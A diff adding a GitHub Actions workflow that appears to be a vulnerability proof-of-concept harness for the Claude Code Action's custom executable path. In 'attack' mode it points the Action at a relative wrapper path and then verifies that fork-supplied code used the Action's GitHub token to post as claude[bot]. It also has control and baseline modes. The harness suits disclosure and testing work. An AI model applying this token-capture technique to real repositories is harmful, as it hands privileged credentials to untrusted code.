@@ -1,0 +1,129 @@
+name: Claude Action custom executable path rebind
+
+run-name: >-
+  Custom executable
+  ${{
+    contains(github.event.comment.body, '@claude-custom-exec-control')
+      && 'pre-materialized control'
+      || (
+        contains(github.event.comment.body, '@claude-custom-exec-baseline')
+          && 'clean baseline'
+          || 'attack'
+      )
+  }}
+  on PR #${{ github.event.issue.number }}
+  comment ${{ github.event.comment.id }}
+
+on:
+  issue_comment:
+    types: [created]
+
+jobs:
+  custom-executable-rebind:
+    if: >-
+      github.event.issue.pull_request &&
+      github.actor == vars.POC_MAINTAINER_LOGIN &&
+      (
+        contains(github.event.comment.body, '@claude-custom-exec-baseline') ||
+        contains(github.event.comment.body, '@claude-custom-exec-control') ||
+        contains(github.event.comment.body, '@claude-custom-exec-attack')
+      )
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      pull-requests: write
+      issues: write
+      id-token: write
+    steps:
+      - name: Check out trusted base branch
+        uses: actions/checkout@v6
+        with:
+          fetch-depth: 1
+
+      - name: Materialize trusted executable before the Action
+        shell: bash
+        run: |
+          set -euo pipefail
+          install -m 0755 \
+            ./tools/claude-wrapper \
+            "$RUNNER_TEMP/trusted-claude-wrapper"
+          test -x "$RUNNER_TEMP/trusted-claude-wrapper"
+          echo "TRUSTED_EXECUTABLE_MATERIALIZED"
+
+      - name: Run pinned Claude Code Action
+        id: claude
+        continue-on-error: true
+        uses: anthropics/claude-code-action@44423bdec74b97d67543eb16c110546762c110b2
+        with:
+          anthropic_api_key: custom-executable-invalid-key
+          path_to_claude_code_executable: >-
+            ${{
+              contains(github.event.comment.body, '@claude-custom-exec-control')
+                && format('{0}/trusted-claude-wrapper', runner.temp)
+                || './tools/claude-wrapper'
+            }}
+          claude_args: >-
+            --max-turns 1
+            --tools ""
+
+      - name: Verify live attack, control, or baseline
+        if: always()
+        shell: bash
+        env:
+          GH_TOKEN: ${{ github.token }}
+          MODE: >-
+            ${{
+              contains(github.event.comment.body, '@claude-custom-exec-control')
+                && 'control'
+                || (
+                  contains(github.event.comment.body, '@claude-custom-exec-baseline')
+                    && 'baseline'
+                    || 'attack'
+                )
+            }}
+        run: |
+          set -euo pipefail
+
+          marker="$RUNNER_TEMP/custom-exec-${GITHUB_RUN_ID}.json"
+          expected="[custom executable path PoC] fork wrapper used the Action token in run ${GITHUB_RUN_ID}."
+
+          test -f "$marker"
+          source_name="$(jq -r '.source' "$marker")"
+          token_present="$(jq -r '.github_token_present' "$marker")"
+          tokens_equal="$(jq -r '.tokens_equal' "$marker")"
+
+          comments="$(
+            gh api \
+              "repos/$GITHUB_REPOSITORY/issues/${{ github.event.issue.number }}/comments?per_page=100"
+          )"
+          proof_author="$(
+            jq -r --arg body "$expected" \
+              '.[] | select(.body == $body) | .user.login' \
+              <<<"$comments" |
+              tail -1
+          )"
+
+          echo "action_outcome=${{ steps.claude.outcome }}"
+          echo "validation_mode=$MODE"
+          echo "executed_source=$source_name"
+          echo "github_token_present=$token_present"
+          echo "tokens_equal=$tokens_equal"
+
+          if [[ "$MODE" == "attack" ]]; then
+            test "$source_name" = "FORK"
+            test "$token_present" = "true"
+            test "$tokens_equal" = "true"
+            test "$proof_author" = "claude[bot]"
+            echo "authenticated_comment_author=claude[bot]"
+            echo "ATTACK_FORK_EXECUTABLE_APP_TOKEN_CONFIRMED"
+            exit 0
+          fi
+
+          test "$source_name" = "BASE"
+          test -z "$proof_author"
+          echo "proof_comment_present=false"
+          if [[ "$MODE" == "control" ]]; then
+            echo "CONTROL_TRUSTED_EXECUTABLE_CONFIRMED"
+          else
+            echo "BASELINE_TRUSTED_EXECUTABLE_CONFIRMED"
+          fi
